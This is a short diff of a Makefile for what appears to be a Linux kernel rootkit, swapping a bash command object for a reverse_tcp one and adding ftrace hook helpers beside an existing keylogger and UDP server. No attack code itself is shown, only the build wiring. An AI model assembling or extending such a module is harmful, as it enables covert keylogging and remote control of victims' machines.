@@ -8,7 +8,7 @@ PWD := $(shell pwd)
 obj-m := main.o
 
 # Specify the source file locations
-main-objs := src/main.o src/com/udp_server.o src/commands/bash.o src/commands/keylogger.o src/include/utils.o
+main-objs := src/main.o src/com/udp_server.o src/commands/reverse_tcp.o src/commands/keylogger.o src/include/utils.o src/hooks/ksmg.o src/hooks/headers/ftrace_helper.o
 
 # Define rules for building the module
 all:
